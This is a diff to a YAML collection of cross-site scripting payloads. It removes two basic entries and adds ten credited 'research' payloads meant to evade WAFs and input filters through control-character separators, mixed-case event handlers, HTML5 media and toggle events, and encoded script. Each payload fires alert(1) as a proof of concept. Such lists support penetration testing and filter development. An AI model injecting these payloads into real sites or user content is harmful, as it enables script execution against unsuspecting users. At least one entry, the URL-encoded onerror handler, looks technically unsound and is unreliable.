@@ -5266,27 +5266,7 @@ payloads:
 
   # === ADDITIONAL BASIC XSS PAYLOADS ===
 
-  - code: |
-      <svg onload=alert(1)>
-    description: "Simple SVG onload event"
-    category: "basic"
-    contributor: "Sid Joshi"
-    github_username: "dr34mhacks"
-    country: "India"
-    tags: ["svg", "onload", "simple"]
-    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
-    date_added: "31-12-2025"
 
-  - code: |
-      <body onload=alert(1)>
-    description: "Body tag onload event"
-    category: "basic"
-    contributor: "Sid Joshi"
-    github_username: "dr34mhacks"
-    country: "India"
-    tags: ["body", "onload", "basic"]
-    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
-    date_added: "31-12-2025"
 
   - code: |
       <input onfocus=alert(1) autofocus>
@@ -10015,3 +9995,119 @@ payloads:
     tags: ["eval", "fromcharcode", "encoding", "string-bypass"]
     browsers: ["Chrome", "Firefox", "Safari", "Edge"]
     date_added: "04-01-2025"
+
+  # === ADVANCED BYPASS TECHNIQUES (Research by Sam Anttila) ===
+  # Source: https://netsec.expert/posts/xss-in-2020/
+  # Credit: Sam Anttila (@the-xentropy)
+
+  - code: |
+      <img\fsrc=x\fonerror=alert(1)>
+    description: "Non-standard character separator using form feed to bypass filters expecting spaces/tabs"
+    category: "research"
+    contributor: "Sam Anttila"
+    github_username: "the-xentropy"
+    country: "Unknown"
+    tags: ["form-feed", "separator", "waf-bypass", "character-encoding"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    date_added: "05-01-2025"
+
+  - code: |
+      <img\rsrc=x\ronerror=alert(1)>
+    description: "Carriage return as attribute separator to bypass space-based filters"
+    category: "research"
+    contributor: "Sam Anttila"
+    github_username: "the-xentropy"
+    country: "Unknown"
+    tags: ["carriage-return", "separator", "waf-bypass", "control-character"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    date_added: "05-01-2025"
+
+  - code: |
+      <img src=x OnErRoR=alert(1)>
+    description: "Mixed case event handler to bypass case-sensitive filters"
+    category: "research"
+    contributor: "Sam Anttila"
+    github_username: "the-xentropy"
+    country: "Unknown"
+    tags: ["case-bypass", "mixed-case", "filter-evasion", "event-handler"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    date_added: "05-01-2025"
+
+  - code: |
+      <svg ONlOaD=alert(1)>
+    description: "Case variation bypass for onload event handler"
+    category: "research"
+    contributor: "Sam Anttila"
+    github_username: "the-xentropy"
+    country: "Unknown"
+    tags: ["case-bypass", "onload", "svg", "case-sensitive-filter"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    date_added: "05-01-2025"
+
+  - code: |
+      <video onloadstart=alert(1)>
+    description: "HTML5 video onloadstart event - newer event handler often missed by WAFs"
+    category: "research"
+    contributor: "Sam Anttila"
+    github_username: "the-xentropy"
+    country: "Unknown"
+    tags: ["html5", "video", "onloadstart", "modern-event", "waf-bypass"]
+    browsers: ["Chrome", "Firefox", "Safari"]
+    date_added: "05-01-2025"
+
+  - code: |
+      <audio oncanplay=alert(1)>
+    description: "HTML5 audio oncanplay event - modern event handler bypassing legacy filters"
+    category: "research"
+    contributor: "Sam Anttila"
+    github_username: "the-xentropy"
+    country: "Unknown"
+    tags: ["html5", "audio", "oncanplay", "modern-event", "filter-bypass"]
+    browsers: ["Chrome", "Firefox", "Safari"]
+    date_added: "05-01-2025"
+
+  - code: |
+      <video onplay=alert(1) autoplay>
+    description: "HTML5 video onplay with autoplay - automatic trigger without user interaction"
+    category: "research"
+    contributor: "Sam Anttila"
+    github_username: "the-xentropy"
+    country: "Unknown"
+    tags: ["html5", "video", "onplay", "autoplay", "no-interaction"]
+    browsers: ["Chrome", "Firefox", "Safari"]
+    date_added: "05-01-2025"
+
+
+
+  - code: |
+      <img src=x onerror=%61%6C%65%72%74%28%31%29>
+    description: "URL-encoded JavaScript execution bypassing keyword filters"
+    category: "research"
+    contributor: "Sam Anttila"
+    github_username: "the-xentropy"
+    country: "Unknown"
+    tags: ["url-encoding", "hex-encoding", "keyword-bypass", "double-encoding"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    date_added: "05-01-2025"
+
+  - code: |
+      <details onbeforetoggle=alert(1) open>
+    description: "Experimental HTML event onbeforetoggle - bypasses WAFs that don't recognize new events"
+    category: "research"
+    contributor: "Sam Anttila"
+    github_username: "the-xentropy"
+    country: "Unknown"
+    tags: ["experimental", "onbeforetoggle", "details", "modern-event", "waf-bypass"]
+    browsers: ["Chrome"]
+    date_added: "05-01-2025"
+
+  - code: |
+      <iframe srcdoc="&lt;script&gt;parent.alert(1)&lt;/script&gt;">
+    description: "HTML entity encoded script in srcdoc bypassing standard script detection"
+    category: "research"
+    contributor: "Sam Anttila"
+    github_username: "the-xentropy"
+    country: "Unknown"
+    tags: ["iframe", "srcdoc", "html-entities", "parent", "encoding-bypass"]
+    browsers: ["Chrome", "Firefox", "Safari"]
+    date_added: "05-01-2025"
